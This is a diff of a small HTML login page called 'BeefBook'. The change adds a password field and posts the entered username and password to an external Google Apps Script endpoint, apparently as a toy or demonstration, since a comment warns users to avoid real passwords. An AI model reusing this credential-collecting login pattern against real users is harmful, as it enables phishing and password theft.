@@ -1,6 +1,6 @@
 
 <!doctype html>
-<html>
+<html lang="en">
   <head>
     <meta charset="utf-8" />
     <title>BeefBook</title>
@@ -11,29 +11,46 @@
     <form id="submitForm">
       <label for="uname">Username:</label><br>
       <input type="text" id="uname" name="username" required><br><br>
+
+      <!-- Removed Email field -->
+
+      <!-- If this is NOT a real password, consider renaming to "note" -->
+      <label for="password">Password (avoid real passwords):</label><br>
+      <textarea id="password" name="password" placeholder="Password"></textarea><br><br>
+
       <input type="submit" value="Log in">
     </form>
 
     <script>
-      const URL = 'https://script.google.com/macros/s/AKfycbyDBqVGK07jiKcZPbpwoQbxgmM94nqB5NCrD7pamoQwbgsaotfGxUUzIz_3jGDQZ-pE/exec'; // Paste your Apps Script URL here
+      const URL = 'https://script.google.com/macros/s/AKfycbyDBqVGK07jiKcZPbpwoQbxgmM94nqB5NCrD7pamoQwbgsaotfGxUUzIz_3jGDQZ-pE/exec';
+
       document.getElementById('submitForm').addEventListener('submit', async (e) => {
         e.preventDefault();
+
         const payload = {
-          username: document.getElementById('uname').value.trim()
+          username: document.getElementById('uname').value.trim(),
+          // email removed
+          password: document.getElementById('password').value.trim()
         };
 
-        const res = await fetch(URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
+        try {
+          const res = await fetch(URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
 
-        const text = await res.text();
-        if (res.ok && text.startsWith('OK')) {
-          // ✅ Redirect to next page
-          window.location.href = 'BBlogedin.html'; // or use window.open(..., '_blank') for new tab
-        } else {
-          alert('Submission failed: ' + text);
+          const text = await res.text();
+
+          if (res.ok && text.startsWith('OK')) {
+            // Open next page in a new tab
+            // Use relative path so it works on GitHub Pages repos
+            window.open('BBlogedin.html', '_blank');
+          } else {
+            alert('Submission failed: ' + text);
+          }
+        } catch (err) {
+          alert('Network error: ' + err);
         }
       });
     </script>
